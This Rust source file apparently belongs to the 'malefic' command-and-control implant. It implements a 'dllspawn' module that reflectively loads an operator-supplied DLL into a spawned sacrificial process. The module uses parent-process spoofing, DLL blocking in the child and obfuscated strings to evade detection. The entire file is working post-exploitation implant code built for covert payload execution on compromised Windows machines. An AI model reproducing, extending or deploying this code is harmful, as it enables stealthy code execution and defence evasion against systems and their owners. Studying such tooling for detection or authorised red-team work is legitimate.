use malefic_helper::common::utils::format_cmdline;
use malefic_helper::win::kit::pe::reflective_loader::reflective_loader;
use malefic_proto::proto::modulepb::BinaryResponse;
use crate::prelude::*;


pub struct ExecuteDllSpawn {}

#[async_trait]
#[module_impl("dllspawn")]
impl Module for ExecuteDllSpawn {}

#[async_trait]
impl malefic_proto::module::ModuleImpl for ExecuteDllSpawn {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_proto::module::Input,
        _sender: &mut malefic_proto::module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let bin = request.bin;
        let params = request.args;
        let process_name = request.process_name;
        let entrypoint = request.entry_point;
        let data = request.data;
        let mut result: Vec<u8> = Vec::new();
        let error;

        if let Some(sacrifice) = request.sacrifice {
            let cmdline = format_cmdline(process_name, params);
            unsafe {
                result = reflective_loader(
                    cmdline.as_ptr() as _,
                    cmdline.len(),
                    entrypoint.as_ptr() as _,
                    entrypoint.len(),
                    bin.as_ptr() as _,
                    bin.len(),
                    data.as_ptr() as _,
                    data.len(),
                    sacrifice.ppid,
                    sacrifice.block_dll,
                    0,
                    request.output,
                )
            }
            error = String::new();
        } else {
            error = obfstr::obfstr!("sacrifice is none").to_string();
        }

        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse {
            status: 0,
            message: Vec::new(),
            data: result,
            err: error,
        }))
        )

    }
}

